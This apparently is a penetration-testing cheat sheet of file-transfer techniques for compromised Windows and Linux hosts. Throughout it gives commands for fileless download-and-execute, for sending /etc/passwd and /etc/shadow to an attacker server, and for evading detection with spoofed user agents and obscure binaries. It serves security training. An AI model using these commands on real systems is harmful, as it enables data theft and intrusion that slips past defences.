# File Transfers Cheatsheet

## Considerations Before Transferring Files
- Host controls (AV/EDR, application whitelisting) and network controls (firewalls, IDS/IPS) can block or flag transfers.
- Have multiple methods ready, if one is blocked, try the next (HTTP(S) and SMB are the most commonly allowed outbound; FTP and raw SSH are often blocked).
- Encrypt sensitive data before transfer whenever possible (see Protected Transfers below).
- Always verify integrity after a transfer with a hash comparison (`md5sum` / `Get-FileHash`).

---

## Windows File Transfer Methods

### Base64 encode/decode (no network needed)
```bash
# On attack host, encode
cat id_rsa | base64 -w 0; echo
md5sum id_rsa
```
```powershell
# On target, decode and write to disk
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
Note: cmd.exe has an 8,191 character string limit, large files may not fit.

### PowerShell web downloads
```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('<URL>','<OutputPath>')
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OutputPath>')

# Fileless (in-memory execution)
IEX (New-Object Net.WebClient).DownloadString('<URL>')
(New-Object Net.WebClient).DownloadString('<URL>') | IEX

# Invoke-WebRequest (aliases: iwr, curl, wget)
Invoke-WebRequest <URL> -OutFile <OutputPath>
Invoke-WebRequest <URL> -UseBasicParsing | IEX   # fixes IE first-launch error

# Bypass untrusted SSL/TLS cert error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB downloads
```bash
# Attack host: start SMB server (anonymous)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With auth (needed if guest access is blocked)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
```cmd
:: Target: direct copy (anonymous)
copy \\<IP>\share\nc.exe

:: Target: with credentials
net use n: \\<IP>\share /user:test test
copy n:\nc.exe
```

### FTP downloads
```bash
# Attack host: start FTP server (anonymous by default)
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
```
```cmd
:: Non-interactive FTP via command file
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Windows upload operations
```powershell
# Base64 encode a file for exfil
[Convert]::ToBase64String((Get-Content -path "<file>" -Encoding byte))
Get-FileHash "<file>" -Algorithm MD5 | select Hash
```
```bash
# Attack host: decode
echo "<base64>" | base64 -d > outfile
md5sum outfile
```
```bash
# Attack host: start upload-capable web server
pip3 install uploadserver
python3 -m uploadserver
```
```powershell
# Target: upload via PSUpload.ps1 helper (Invoke-RestMethod based)
IEX(New-Object Net.WebClient).DownloadString('<PSUpload.ps1 URL>')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File <path>

# Or base64 + POST, caught with netcat on attack host
$b64 = [System.Convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
```

### SMB uploads via WebDAV (when raw SMB/445 is blocked outbound)
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
```cmd
dir \\<IP>\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\<IP>\DavWWWRoot\
```

### FTP uploads
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
```powershell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

## Linux File Transfer Methods

### Base64 encode/decode
```bash
cat id_rsa | base64 -w 0; echo        # on attack host
echo -n '<base64>' | base64 -d > id_rsa   # on target
md5sum id_rsa
```

### Web downloads
```bash
wget <URL> -O /tmp/file.sh
curl -o /tmp/file.sh <URL>

# Fileless (pipe directly into interpreter)
curl <URL> | bash
wget -qO- <URL> | python3
```

### Bash /dev/tcp (no wget/curl available)
```bash
exec 3<>/dev/tcp/<IP>/80
echo -e "GET /file.sh HTTP/1.1\n\n" >&3
cat <&3
```

### SSH / SCP
```bash
# Attack host: enable SSH server
sudo systemctl enable ssh
sudo systemctl start ssh

# Download from target to attack host
scp user@<target_IP>:/root/file.txt .

# Upload from target to attack host (or vice versa)
scp /etc/passwd user@<IP>:/home/user/
```

### Linux web uploads
```bash
# Attack host: HTTPS upload server with self-signed cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
```bash
# Target: upload (multiple files supported)
curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Quick ad-hoc web servers (for pulling a file off a compromised host)
```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```
Then on the attack host: `wget <target_IP>:8000/file.txt`

---

## Transferring Files with Code (one-liners)
```bash
# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "out.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "out.sh")'

# PHP
php -r '$f=file_get_contents("<URL>"); file_put_contents("out.sh",$f);'
php -r '$lines=@file("<URL>"); foreach ($lines as $l){echo $l;}' | bash

# Ruby
ruby -e 'require "net/http"; File.write("out.sh", Net::HTTP.get(URI.parse("<URL>")))'

# Perl
perl -e 'use LWP::Simple; getstore("<URL>", "out.sh");'
```
```python
# Python3 upload (requests module)
python3 -c 'import requests;requests.post("http://<IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
```cmd
:: Windows: JavaScript/VBScript downloaders via cscript.exe
cscript.exe /nologo wget.js <URL> <OutFile>
cscript.exe /nologo wget.vbs <URL> <OutFile>
```

---

## Miscellaneous Methods

### Netcat / Ncat
```bash
# Target listens, attack host sends
victim$ nc -l -p 8000 > file.exe
attacker$ nc -q 0 <target_IP> 8000 < file.exe

# Ncat equivalent
victim$ ncat -l -p 8000 --recv-only > file.exe
attacker$ ncat --send-only <target_IP> 8000 < file.exe

# Reverse direction (attack host listens, useful if inbound to target is blocked)
attacker$ sudo nc -l -p 443 -q 0 < file.exe
victim$ nc <attacker_IP> 443 > file.exe
```
```bash
# No netcat on target: use /dev/tcp
victim$ cat < /dev/tcp/<attacker_IP>/443 > file.exe
```

### PowerShell Remoting (WinRM) file transfer
```powershell
Test-NetConnection -ComputerName <host> -Port 5985
$Session = New-PSSession -ComputerName <host>
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\remote\file.txt" -Destination C:\ -FromSession $Session
```

### RDP
- Copy/paste directly in an active RDP session.
- Mount a local folder into the session:
```bash
rdesktop <IP> -d <DOMAIN> -u <user> -p '<pass>' -r disk:linux='/local/path'
xfreerdp /v:<IP> /d:<DOMAIN> /u:<user> /p:'<pass>' /drive:linux,/local/path
```
Access via `\\tsclient\` inside the RDP session, or natively through `mstsc.exe` drive redirection.

---

## Protected File Transfers (Encrypt Before Transfer)
Never exfiltrate real PII/financial data/trade secrets unless explicitly scoped, use dummy data to test DLP controls instead.

### Windows: Invoke-AESEncryption.ps1
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

### Linux: OpenSSL
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
Use a strong, unique password per engagement, never reuse one password across clients.

---

## Catching Files over HTTP/S (Nginx upload server)
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
`/etc/nginx/sites-available/upload.conf`:
```
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default   # if port 80 conflicts
sudo systemctl restart nginx.service
```
```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
Nginx is preferred over Apache here, less prone to accidentally allowing uploaded files (e.g. `.php`) to execute, and directory listing is off by default.

---

## Living off the Land (LOLBAS / GTFOBins)

LOLBAS (Windows) and GTFOBins (Linux) catalog built-in binaries that can be abused for download, upload, command execution, file read/write, and defense bypasses.

### Windows examples
```cmd
:: certreq.exe upload
certreq.exe -Post -config http://<IP>:8000/ c:\windows\win.ini

:: Bitsadmin download
bitsadmin /transfer wcb /priority foreground http://<IP>:8000/nc.exe C:\Users\Public\nc.exe

:: PowerShell BITS
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

:: Certutil (flagged by AMSI as of recent Windows/Defender versions)
certutil.exe -verifyctl -split -f http://<IP>:8000/nc.exe
certutil -urlcache -split -f http://<IP>/nc.exe
```

### Linux example (OpenSSL, "nc style")
```bash
# Attack host: generate cert and serve the file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Target: pull the file
openssl s_client -connect <IP>:80 -quiet > LinEnum.sh
```

Check LOLBAS and GTFOBins regularly, new binaries get added, and an obscure one is more likely to slip past a whitelist or evade alerting.

---

## Detection Considerations (Blue Team / Awareness)

Default user agent strings can fingerprint the tool behind a transfer:

| Technique | User-Agent string |
|---|---|
| Invoke-WebRequest / Invoke-RestMethod | `WindowsPowerShell/<version>` |
| WinHttpRequest COM object | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Msxml2.XMLHTTP COM object | `Mozilla/4.0 (compatible; MSIE 7.0; ...; Trident/7.0; ...)` |
| certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

Defenders: build a whitelist of legitimate user agents/binaries rather than relying on blacklists, which are trivially bypassed with case obfuscation or an uncommon LOLBin.

## Evading Detection

### Spoof the User-Agent
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Use an unusual LOLBin
Less common binaries (e.g. vendor-specific tools like `GfxDownloadWrapper.exe` from the Intel Graphics Driver) may be whitelisted by application control and excluded from alerting precisely because they're obscure. Always check LOLBAS/GTFOBins for something the target environment may not think to block.
